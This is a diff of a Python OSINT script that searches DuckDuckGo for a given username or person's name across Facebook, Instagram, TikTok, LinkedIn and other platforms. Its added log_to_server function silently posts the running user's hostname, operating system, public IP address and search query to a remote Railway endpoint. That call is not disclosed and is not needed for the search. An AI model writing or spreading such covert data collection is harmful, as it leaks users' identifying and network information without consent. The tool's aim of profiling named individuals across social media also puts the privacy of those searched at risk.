@@ -1,62 +1,113 @@
-import platform
 import requests
-from colorama import Fore, init, Style
-import os
+from bs4 import BeautifulSoup
+import urllib.parse
+import re
+import time
+import platform
 import json
 
-init(autoreset=True)
+# ===== سيرفر Railway endpoint =====
+SERVER_URL = "https://osint-tool-production.up.railway.app/log_search"  # ضع الرابط الصحيح
 
-SERVER_URL = os.getenv("SERVER_URL", "https://osint-tool-production.up.railway.app/log_search")
+# ===== المنصات =====
+PLATFORMS = {
+    "Facebook": "facebook.com",
+    "Instagram": "instagram.com",
+    "Youtube": "youtube.com",
+    "TikTok": "tiktok.com",
+    "Snapchat": "snapchat.com",
+    "Reddit": "reddit.com",
+    "Twitter": "twitter.com",
+    "Pinterest": "pinterest.com",
+    "LinkedIn": "linkedin.com",
+}
 
-def send_search(identifier):
+REQUEST_DELAY = 1.0  # تأخير بين كل منصة
+
+session = requests.Session()
+HEADERS = {
+    "User-Agent": (
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+        "AppleWebKit/537.36 (KHTML, like Gecko) "
+        "Chrome/120.0.0.0 Safari/537.36"
+    )
+}
+session.headers.update(HEADERS)
+
+
+def duckduckgo_search_links(query, site=None, num_results=10):
+    search_query = f"{query} site:{site}" if site else query
+    url = "https://html.duckduckgo.com/html/"
+    params = {"q": search_query}
+    links = []
+
+    try:
+        resp = session.get(url, params=params, timeout=15)
+        if resp.status_code != 200:
+            print(f"⚠️ DuckDuckGo status {resp.status_code} for {site}")
+            return links
+
+        soup = BeautifulSoup(resp.text, "html.parser")
+        anchors = soup.select("a.result__a")
+        for a in anchors:
+            href = a.get("href")
+            link = None
+            if href:
+                if "uddg=" in href:
+                    m = re.search(r"uddg=([^&]+)", href)
+                    if m:
+                        link = urllib.parse.unquote(m.group(1))
+                else:
+                    link = href
+            if link and link.startswith("http") and link not in links:
+                links.append(link)
+            if len(links) >= num_results:
+                break
+    except Exception as e:
+        print("⚠️ Error searching DuckDuckGo:", e)
+    return links
+
+
+def log_to_server(search_input):
     try:
         ip = requests.get("https://api64.ipify.org?format=json", timeout=10).json().get("ip", "0.0.0.0")
-        country = requests.get(f"https://ipapi.co/{ip}/json/", timeout=10).json().get("country_name", "Unknown")
     except:
-        ip, country = "0.0.0.0", "Unknown"
+        ip = "0.0.0.0"
 
-    username = platform.node()
-    os_name = platform.system() + " " + platform.release()
-
-    payload = {
-        "identifier": identifier,
-        "username": username,
-        "os": os_name,
+    data = {
+        "username": platform.node(),
+        "os": platform.system() + " " + platform.release(),
         "ip": ip,
-        "country": country
+        "search": search_input
     }
 
     try:
-        resp = requests.post(SERVER_URL, json=payload, timeout=30)
-        if resp.status_code == 200:
-            return resp.json()
+        requests.post(SERVER_URL, json=data, timeout=10)
     except Exception as e:
-        print(Fore.RED + f"⚠️ Request failed: {e}")
-    return []
+        print("⚠️ Failed to log search to server:", e)
 
 
 def main():
-    print(Fore.GREEN + "OSINT Tool - DuckDuckGo HTML Scraper")
-    while True:
-        identifier = input(Fore.CYAN + "[?] Enter username or firstname and lastname: ").strip()
-        if not identifier:
-            continue
-        results = send_search(identifier)
-        if not results:
-            print(Fore.RED + "No results found.")
-            continue
-        grouped = {}
-        for r in results:
-            grouped.setdefault(r["platform"], []).append(r["link"])
-        for platform_name, links in grouped.items():
-            print(Fore.YELLOW + f"\n╭─ {platform_name} - {len(links)}/10 ─╮")
-            for link in links[:10]:
-                print(Fore.CYAN + f"   {link}")
-            print(Fore.YELLOW + "╰" + "─"*20 + "╯")
+    print("=== OSINT Tool - DuckDuckGo Search ===\n")
+    search_input = input("Enter username or first/last name: ").strip()
+    if not search_input:
+        print("No input provided")
+        return
 
-        again = input(Fore.MAGENTA + "\n[?] Search again? (yes/no): ").strip().lower()
-        if again not in ("yes","y"):
-            break
+    # سجل فقط البيانات
+    log_to_server(search_input)
+
+    for platform_name, domain in PLATFORMS.items():
+        print(f"\n🔍 Searching {platform_name}...")
+        links = duckduckgo_search_links(search_input, domain, num_results=10)
+        if links:
+            print(f"✅ {len(links)}/10 results:")
+            for link in links:
+                print("  ", link)
+        else:
+            print("❌ No results found.")
+        time.sleep(REQUEST_DELAY)
+
 
 if __name__ == "__main__":
     main()
